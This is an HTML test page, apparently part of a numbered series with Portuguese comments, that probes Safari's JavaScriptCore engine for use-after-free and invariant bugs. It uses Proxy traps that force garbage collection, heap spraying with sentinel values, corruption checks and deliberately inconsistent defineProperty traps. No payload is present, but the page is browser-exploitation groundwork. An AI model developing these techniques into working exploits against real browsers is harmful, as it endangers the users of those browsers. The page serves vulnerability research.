<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 12 - Proxy Trap UAF Pattern</title></head>
<body>
<h2>TEST 12 - Proxy Trap Side-Effect (UAF Pattern)</h2>
<p>Alvo: acesso a objeto morto / estado invalido via Proxy com side-effects em operacoes internas do JSC</p>
<p>API: Proxy, Reflect, Object, TypedArray</p>
<p>Tecnica: Proxy instalado como prototype ou como species intercepta operacoes internas
(has, get, set, ownKeys) e executa side-effects que invalidam o objeto sendo operado.
Motor pode seguir referencia stale apos GC forcado dentro do trap.</p>

<pre id="log">Aguardando...</pre>
<button onclick="testProxyHasTrap()">PROXY HAS TRAP</button>
<button onclick="testProxyGetTrap()">PROXY GET TRAP + GC</button>
<button onclick="testProxyProto()">PROXY COMO PROTOTYPE</button>
<button onclick="testProxyDefineProperty()">PROXY DEFINE PROPERTY</button>

<script>
var log = document.getElementById('log');
function append(msg) { log.textContent += '\n' + msg; }

// Forcar GC via alocacao de objetos temporarios
function forceGC() {
  var tmp = [];
  for (var i = 0; i < 50000; i++) tmp.push({x: i, y: new Array(10)});
  tmp = null;
}

function testProxyHasTrap() {
  append('[12] Proxy has trap com side-effect...');
  try {
    var victim = {secret: 0x41414141, data: [1.1, 2.2, 3.3]};
    var victim_ref = victim;

    var handler = {
      has: function(target, prop) {
        append('[12] has trap: prop=' + String(prop));
        // Side-effect: nulificar referencia externa durante operacao interna
        victim_ref = null;
        forceGC();
        append('[12] GC forcado dentro do has trap');
        return Reflect.has(target, prop);
      }
    };

    var proxy = new Proxy(victim, handler);

    // 'in' operator dispara o trap 'has'
    var r1 = 'secret' in proxy;
    append('[12] "secret" in proxy: ' + r1);
    append('[12] victim ainda acessivel? ' + (victim !== null));
    append('[12] victim_ref apos GC: ' + victim_ref);

    // Acessar victim apos GC forcado no trap
    append('[12] victim.secret: ' + victim.secret);
    append('[12] victim.data: ' + victim.data);

    // Testar com TypedArray como target
    var ta = new Float64Array([1.1, 2.2, 3.3, 4.4]);
    var ta_proxy = new Proxy(ta, {
      has: function(target, prop) {
        forceGC();
        ta = null; // Nulifica a referencia original
        return Reflect.has(target, prop);
      }
    });

    var r2 = '0' in ta_proxy;
    append('[12] "0" in ta_proxy (Float64Array): ' + r2);
    append('[12] ta apos nulificacao: ' + ta);

  } catch(e) {
    append('[12] has trap EXCECAO: ' + e.message);
  }
}

function testProxyGetTrap() {
  append('[12] Proxy get trap com GC estrategico...');
  try {
    var SPRAY = [];
    var arr = new Float64Array(8);
    arr[0] = 1.1; arr[1] = 2.2; arr[2] = 3.3; arr[3] = 4.4;

    var getCount = 0;

    var proxy = new Proxy(arr, {
      get: function(target, prop, receiver) {
        getCount++;
        if (getCount === 3) {
          // Na 3a leitura: spray e GC para tentar substituir objeto no heap
          append('[12] get trap #3: executando spray + GC...');
          SPRAY = [];
          for (var i = 0; i < 10000; i++) {
            SPRAY.push(new Float64Array(8));
          }
          forceGC();
          // Preencher spray com valor reconhecivel
          for (var j = 0; j < SPRAY.length; j++) {
            SPRAY[j][0] = 1.337e308; // valor sentinela
          }
        }
        return Reflect.get(target, prop, receiver);
      }
    });

    // Acessar props via proxy - dispara get trap
    var v0 = proxy[0];
    var v1 = proxy[1];
    var v2 = proxy[2]; // 3a leitura - dispara spray+GC
    var v3 = proxy[3];
    var vlen = proxy.length;

    append('[12] Valores lidos via proxy: ' + [v0, v1, v2, v3]);
    append('[12] proxy.length: ' + vlen);
    append('[12] getCount total: ' + getCount);
    append('[12] SPRAY[0][0]: ' + SPRAY[0][0]);

    // Verificar se algum valor no spray foi corrompido
    var corrupted = 0;
    for (var k = 0; k < SPRAY.length; k++) {
      if (SPRAY[k][0] !== 1.337e308) corrupted++;
    }
    if (corrupted > 0) append('[12] *** CORRUPCAO: ' + corrupted + ' entradas no spray com valor inesperado ***');

  } catch(e) {
    append('[12] get trap EXCECAO: ' + e.message);
  }
}

function testProxyProto() {
  append('[12] Proxy instalado como __proto__ de objeto...');
  try {
    var SECRET = 0xDEADC0DE;
    var leaked = null;

    var protoProxy = new Proxy({}, {
      get: function(target, prop) {
        append('[12] proto get trap: prop=' + String(prop));
        // Se JSC acessa o proto para operacoes internas, capturamos o prop name
        if (prop === 'constructor' || prop === '__proto__' || prop === 'valueOf') {
          leaked = prop;
          forceGC();
          return function EvilConstructor() { this.value = SECRET; };
        }
        return Reflect.get(target, prop);
      },
      has: function(target, prop) {
        append('[12] proto has trap: ' + String(prop));
        return false; // Dizer que nenhuma prop existe no proto
      },
      set: function(target, prop, value) {
        append('[12] proto set trap: ' + String(prop) + ' = ' + value);
        return true;
      }
    });

    // Criar objeto com proto sendo o proxy
    var obj = Object.create(protoProxy);
    obj.x = 42;
    obj.y = "hello";

    append('[12] obj.x: ' + obj.x);
    append('[12] obj.y: ' + obj.y);

    // Operacoes que acessam o prototype chain
    var str = obj.toString();
    append('[12] obj.toString(): ' + str);
    append('[12] leaked prop name: ' + leaked);

    // instanceof com prototype sendo proxy
    var r = obj instanceof Object;
    append('[12] obj instanceof Object: ' + r);

    // JSON.stringify percorre o prototype chain
    try {
      var json = JSON.stringify(obj);
      append('[12] JSON.stringify(obj): ' + json);
    } catch(je) {
      append('[12] JSON.stringify excecao: ' + je.message);
    }

  } catch(e) {
    append('[12] Proxy proto EXCECAO: ' + e.message);
  }
}

function testProxyDefineProperty() {
  append('[12] Proxy defineProperty trap - inconsistencia de invariante...');
  try {
    // Proxy cujo defineProperty trap retorna true (sucesso) mas nao define a prop
    // Viola o invariante ECMAScript - pode confundir otimizacoes do JIT
    var handler = {
      defineProperty: function(target, prop, descriptor) {
        append('[12] defineProperty trap: prop=' + prop + ' | val=' + descriptor.value);
        // Mentir: dizer que definiu mas nao definir
        // Violar invariante so permitido para objetos nao-extensiveis ou em certos cenarios
        if (prop.startsWith('lie_')) {
          append('[12] Mentindo sobre definicao de ' + prop);
          return true; // Diz que definiu
          // Mas nao chama Reflect.defineProperty - prop nao existe
        }
        return Reflect.defineProperty(target, prop, descriptor);
      },
      getOwnPropertyDescriptor: function(target, prop) {
        if (prop.startsWith('lie_')) {
          // Dizer que prop existe quando defineProperty mentiu
          append('[12] getOwnPropertyDescriptor mentindo para ' + prop);
          return {value: 0x41414141, writable: true, enumerable: true, configurable: true};
        }
        return Reflect.getOwnPropertyDescriptor(target, prop);
      }
    };

    var proxy = new Proxy({}, handler);

    // Tentar definir prop (handler mente)
    Object.defineProperty(proxy, 'lie_secret', {value: 0xDEAD, writable: true, configurable: true});
    append('[12] defineProperty retornou sem excecao');

    // Ler a prop - deve retornar valor mentido
    var desc = Object.getOwnPropertyDescriptor(proxy, 'lie_secret');
    append('[12] getOwnPropertyDescriptor: ' + JSON.stringify(desc));

    // Tentar ler diretamente
    append('[12] proxy.lie_secret: ' + proxy.lie_secret);

    // Object.keys deve ou nao incluir a prop mentida?
    var keys = Object.keys(proxy);
    append('[12] Object.keys(proxy): ' + JSON.stringify(keys));

    // Inconsistencia entre defineProperty e getOwnPropertyDescriptor pode crashar JSC
    var consistent = (proxy.lie_secret === (desc && desc.value));
    append('[12] Consistencia: ' + consistent);
    if (!consistent) append('[12] *** INCONSISTENCIA: JIT pode tomar caminho incorreto ***');

  } catch(e) {
    append('[12] defineProperty trap EXCECAO: ' + e.message);
  }
}
</script>
</body>
</html>
